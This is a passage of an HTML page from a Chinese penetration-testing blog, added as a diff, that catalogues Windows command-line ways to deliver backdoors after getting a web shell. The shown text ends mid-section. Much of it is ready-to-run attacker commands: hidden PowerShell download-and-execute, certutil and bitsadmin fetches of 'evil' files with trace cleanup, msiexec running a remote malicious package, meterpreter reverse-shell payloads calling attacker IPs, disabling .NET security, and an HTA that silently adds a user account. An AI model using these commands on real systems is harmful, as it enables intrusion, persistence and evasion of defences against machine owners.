@@ -1,0 +1,757 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Windows命令行下载文件方法 - 剑胆琴心</title><meta name="author" content="剑胆琴心">
+<meta name="author-link" content="http://geoer.cn">
+<meta name="description" content="当我们通过Web方式获取了一个Shell，而目标主机是Windows，我们下面后门文件到目标主机一般有两种方式： 远程下载文件到本地，然后再执" /><meta name="keywords" content='命令行下载文件, shell' /><meta itemprop="name" content="Windows命令行下载文件方法">
+<meta itemprop="description" content="当我们通过Web方式获取了一个Shell，而目标主机是Windows，我们下面后门文件到目标主机一般有两种方式： 远程下载文件到本地，然后再执"><meta itemprop="datePublished" content="2020-09-22T20:50:27+08:00" />
+<meta itemprop="dateModified" content="2023-01-21T16:47:23+08:00" />
+<meta itemprop="wordCount" content="2412"><meta itemprop="image" content="https://geoer.cn/logo.png"/>
+<meta itemprop="keywords" content="命令行下载文件,shell," /><meta property="og:title" content="Windows命令行下载文件方法" />
+<meta property="og:description" content="当我们通过Web方式获取了一个Shell，而目标主机是Windows，我们下面后门文件到目标主机一般有两种方式： 远程下载文件到本地，然后再执" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://geoer.cn/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/" /><meta property="og:image" content="https://geoer.cn/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-09-22T20:50:27+08:00" />
+<meta property="article:modified_time" content="2023-01-21T16:47:23+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://geoer.cn/logo.png"/>
+
+<meta name="twitter:title" content="Windows命令行下载文件方法"/>
+<meta name="twitter:description" content="当我们通过Web方式获取了一个Shell，而目标主机是Windows，我们下面后门文件到目标主机一般有两种方式： 远程下载文件到本地，然后再执"/>
+<meta name="application-name" content="剑胆琴心">
+<meta name="apple-mobile-web-app-title" content="剑胆琴心"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://geoer.cn/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/" /><link rel="prev" href="https://geoer.cn/%E8%BF%94%E6%A0%A1%E8%80%83%E5%85%AD%E7%BA%A7/" /><link rel="next" href="https://geoer.cn/windows-sc%E5%91%BD%E4%BB%A4/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Windows命令行下载文件方法",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/geoer.cn\/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95\/"
+    },"image": [{
+              "@type": "ImageObject",
+              "url": "https:\/\/geoer.cn\/images\/Apple-Devices-Preview.jpg",
+              "width":  1842 ,
+              "height":  1036 
+            }],"genre": "posts","keywords": "命令行下载文件, shell","wordcount":  2412 ,
+    "url": "https:\/\/geoer.cn\/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95\/","datePublished": "2020-09-22T20:50:27+08:00","dateModified": "2023-01-21T16:47:23+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+      "@type": "Organization",
+      "name": "剑胆琴心","logo": {
+          "@type": "ImageObject",
+          "url": "https:\/\/geoer.cn\/images\/avatar.png",
+          "width":  438 ,
+          "height":  438 
+        }},"author": {
+        "@type": "Person",
+        "name": "剑胆琴心"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tests/"
+                title="FixIt 测试"
+                
+              ><i class="fa-solid fa-flask fa-fw fa-sm" aria-hidden="true"></i> 测试</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                title="友情链接"
+                
+              ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li>
+      </ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="/images/avatar.png"
+    title="/images/avatar.png" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tests/"
+                  title="FixIt 测试"
+                  
+                ><i class="fa-solid fa-flask fa-fw fa-sm" aria-hidden="true"></i> 测试</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  title="友情链接"
+                  
+                ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li
+              class="menu-item text-center"
+            ><a
+                  class="menu-link"
+                  href="https://github.com/shuai06"
+                  title="GitHub"
+                  rel="noopener noreferrer" target="_blank"
+                ><i class='fa-brands fa-github fa-fw' aria-hidden='true'></i> </a></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
+        <span>Windows命令行下载文件方法</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="http://geoer.cn" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img
+    class="lazyload avatar"
+    src="/svg/loading.min.svg"
+    data-src="https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp"
+    data-srcset="https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp, https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp 1.5x, https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心"/>&nbsp;剑胆琴心</a></span>
+          <span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 渗透测试</a></span></div>
+      <div class="post-meta-line"><span title=2020-09-22&#32;20:50:27><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2020-09-22">2020-09-22</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 2412 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 5 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="Windows命令行下载文件方法">
+              <i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
+            </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#1powershell">1.Powershell</a></li>
+        <li><a href="#2bitsadmin">2.Bitsadmin</a></li>
+        <li><a href="#3certutil">3.certutil</a></li>
+        <li><a href="#4wget">4.wget</a></li>
+        <li><a href="#5ipc文件共享">5.ipc$文件共享</a></li>
+        <li><a href="#6ftp">6.FTP</a></li>
+        <li><a href="#7tftp">7.TFTP</a></li>
+        <li><a href="#8winscp">8.WinScp</a></li>
+        <li><a href="#9msiexec">9.msiexec</a></li>
+        <li><a href="#10ieexec">10.IEExec</a></li>
+        <li><a href="#11mshta">11.mshta</a></li>
+        <li><a href="#12rundll32">12.rundll32</a></li>
+        <li><a href="#13regsvr32">13.regsvr32</a></li>
+        <li><a href="#14msxslexe">14.MSXSL.EXE</a></li>
+        <li><a href="#15pubprnvbs">15.pubprn.vbs</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>当我们通过Web方式获取了一个Shell，而目标主机是Windows，我们下面后门文件到目标主机<strong>一般有两种方式：</strong></p>
+<ol>
+<li>
+<p>远程下载文件到本地，然后再执行；</p>
+</li>
+<li>
+<p>远程下载执行，执行过程没有二进制文件落地（这种方式已然成为后门文件下载执行的首要方式）</p>
+</li>
+</ol>
+<p><strong>常见的下载方式</strong></p>
+<ul>
+<li>PowerShell</li>
+<li>Bitsadmin</li>
+<li>certutil</li>
+<li>wget</li>
+<li>ipc$文件共享</li>
+<li>FTP</li>
+<li>TFTP</li>
+<li>WinScp</li>
+<li>msiexec</li>
+<li>IEExec</li>
+<li>mshta</li>
+<li>rundll32</li>
+<li>regsvr32</li>
+<li>MSXSL.EXE</li>
+<li>pubprn.vbs</li>
+</ul>
+<h3 id="1powershell">1.Powershell</h3>
+<p>远程下载文件保存在本地：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">powershell <span class="o">(</span>new-object System.Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">&#39;http://192.168.0.115/payload.txt&#39;</span>,<span class="s1">&#39;payload.exe&#39;</span><span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>远程执行命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">powershell -nop -w hidden -c <span class="s2">&#34;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.28.128/imag/evil.txt&#39;))&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="2bitsadmin">2.Bitsadmin</h3>
+<p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bitsadmin /transfer n http://192.168.28.128/imag/evil.txt D:<span class="se">\1</span>.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="3certutil">3.certutil</h3>
+<p>用于备份证书服务，支持xp-win10。由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。</p>
+<p>注：缓存目录为<code>%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#下载文件 </span>
+</span></span><span class="line"><span class="cl">certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php 
+</span></span><span class="line"><span class="cl"><span class="c1">#删除缓存 </span>
+</span></span><span class="line"><span class="cl">certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt delete
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="4wget">4.wget</h3>
+<p>Windows环境下，可上传免安装的可执行程序wget.exe到目标机器，然后使用wget下载文件。</p>
+<p>下载地址：https://eternallybored.org/misc/wget/</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget -O <span class="s2">&#34;evil.txt&#34;</span> http://192.168.28.128/imag/evil.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="5ipc文件共享">5.ipc$文件共享</h3>
+<p>IPC$(Internet Process Connection)是共享&quot;命名管道&quot;的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#建立远程IPC连接 </span>
+</span></span><span class="line"><span class="cl">net use <span class="se">\\</span>192.168.28.128<span class="se">\i</span>pc$ /user:administrator <span class="s2">&#34;abc123!&#34;</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#复制远程文件到本地主机 </span>
+</span></span><span class="line"><span class="cl">copy <span class="se">\\</span>192.168.28.128<span class="se">\c</span>$<span class="se">\2</span>.txt D:<span class="se">\t</span>est
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="6ftp">6.FTP</h3>
+<p>一般情况下，攻击者使用FTP上传文件需要很多交互的步骤，下面这个 bash脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ftp 127.0.0.1 	<span class="c1"># 这里换成我们装有payload的服务器的IP地址</span>
+</span></span><span class="line"><span class="cl">username <span class="c1"># 输入用户名</span>
+</span></span><span class="line"><span class="cl">password 	<span class="c1"># 密码</span>
+</span></span><span class="line"><span class="cl">get file 	<span class="c1"># 下载的payload文件</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="7tftp">7.TFTP</h3>
+<p>用来下载远程文件的最简单的网络协议，它基于<code>UDP</code>协议而实现</p>
+<p>tftp32服务端下载地址：http://tftpd32.jounin.net/tftpd32_download.html</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tftp -i &lt;你的payload的IP&gt; get &lt;要下载payload文件&gt; &lt;存放目标机器的目录位置&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="8winscp">8.WinScp</h3>
+<p>WinSCP是一个Windows环境下使用SSH的开源图形化SFTP客户端。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#上传 </span>
+</span></span><span class="line"><span class="cl">winscp.exe /console /command <span class="s2">&#34;option batch continue&#34;</span> <span class="s2">&#34;option confirm off&#34;</span> <span class="s2">&#34;open sftp://bypass:abc123!@192.168.28.131:22&#34;</span> <span class="s2">&#34;option transfer binary&#34;</span> <span class="s2">&#34;put D:\1.txt /tmp/&#34;</span> <span class="s2">&#34;exit&#34;</span> /log<span class="o">=</span>log_file.txt 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#下载 </span>
+</span></span><span class="line"><span class="cl">winscp.exe /console /command <span class="s2">&#34;option batch continue&#34;</span> <span class="s2">&#34;option confirm off&#34;</span> <span class="s2">&#34;open sftp://bypass:abc123!@192.168.28.131:22&#34;</span> <span class="s2">&#34;option transfer binary&#34;</span> <span class="s2">&#34;get /tmp D:\test\app\&#34; &#34;</span>exit<span class="s2">&#34; /log=log_file.tx
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="9msiexec">9.msiexec</h3>
+<p>msiexec 支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#在攻击机器上生成msi包 </span>
+</span></span><span class="line"><span class="cl">msfvenom -p windows/exec <span class="nv">CMD</span><span class="o">=</span><span class="s1">&#39;net user test abc123! /add&#39;</span> -f msi &gt; evil.msi 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#在目标机器上远程执行（直接写payload的ip和文件） </span>
+</span></span><span class="line"><span class="cl">msiexec /q /i http://192.168.28.128/evil.msi
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="10ieexec">10.IEExec</h3>
+<p>IEexec.exe应用程序是.NET Framework附带程序，存在于多个系统白名单内。</p>
+<p>先在攻击机生成Payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>192.168.28.131 <span class="nv">lport</span><span class="o">=</span><span class="m">4444</span> -f exe -o evil.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用管理员身份打开cmd，分别运行下面两条命令。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\M</span>icrosoft.NET<span class="se">\F</span>ramework64<span class="se">\v</span>2.0.50727&gt;caspol.exe -s off
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\M</span>icrosoft.NET<span class="se">\F</span>ramework64<span class="se">\v</span>2.0.50727&gt;IEExec.exe http://192.168.28.131/evil.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="11mshta">11.mshta</h3>
+<p>mshta用于执行<code>.hta</code>文件，而hta是<code>HTML Applocation</code>的缩写，也就是HTML应用程序。</p>
+<p>而hta中也支持VBS。所以我们可以利用hta来下载文件。</p>
+<p><strong>1.生成payload.hta</strong></p>
+<p>run.hta内容如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">HTML</span><span class="p">&gt;</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;Content-Type&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;text/html; charset=utf-8&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">HEAD</span><span class="p">&gt;</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">script</span> <span class="na">language</span><span class="o">=</span><span class="s">&#34;VBScript&#34;</span><span class="p">&gt;</span> 
+</span></span><span class="line"><span class="cl">            <span class="nx">Window</span><span class="p">.</span><span class="nx">ReSizeTo</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span> <span class="nx">Window</span><span class="p">.</span><span class="nx">moveTo</span> <span class="o">-</span><span class="mi">2000</span><span class="p">,</span><span class="o">-</span><span class="mi">2000</span> <span class="nx">Set</span> <span class="nx">objShell</span> <span class="o">=</span> <span class="nx">CreateObject</span><span class="p">(</span><span class="s2">&#34;Wscript.Shell&#34;</span><span class="p">)</span> <span class="nx">objShell</span><span class="p">.</span><span class="nx">Run</span> <span class="s2">&#34;cmd.exe /c net user test password /add&#34;</span> <span class="c1">// 这里填写命令 self.close 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span> demo <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">HEAD</span><span class="p">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">HTML</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>或者参考这个文章生成hta:https://www.cnblogs.com/backlion/p/10491616.html</p>
+<p>方法1：MSFVenom</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 先生成payload</span>
+</span></span><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>121.36.37.235 <span class="nv">lport</span><span class="o">=</span><span class="m">2222</span> -f hta-psh &gt; shell.hta
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># msf监听</span>
+</span></span><span class="line"><span class="cl">use exploit/multi/handler
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> payload windows/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> lhost 192.168.1.109
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> lport <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">exploit
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>方法2：Metasploit</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use exploit/windows/misc/hta_server
+</span></span><span class="line"><span class="cl">msf exploit<span class="o">(</span>windows/misc/hta_server<span class="o">)</span> &gt; <span class="nb">set</span> srvhost 192.168.1.109
